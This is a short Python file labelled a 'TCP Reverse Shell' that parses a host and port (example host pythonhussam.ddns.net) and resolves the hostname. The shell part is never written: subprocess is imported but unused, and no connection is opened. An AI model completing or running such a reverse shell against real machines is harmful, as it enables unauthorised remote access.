import socket
import subprocess
import sys
import argparse


def parse_arguments():
    parser = argparse.ArgumentParser(
        description="TCP Reverse Shell", epilog="%(prog)s pythonhussam.ddns.net 8080"
    )
    parser.add_argument("host", type=str, help="Hostname like 'pythonhussam.ddns.net'")
    parser.add_argument("port", type=int, help="Port Number")
    return parser.parse_args()


def hostnameToIp(hostname):
    ip = socket.gethostbyname(hostname)
    return ip


def main():
    args = parse_arguments()
    hostname = args.host
    port = args.port
    try:
        ip = hostnameToIp(hostname)
    except socket.gaierror:
        sys.stderr.write("Unable to resolve {}".format(hostname))


if __name__ == "__main__":
    main()
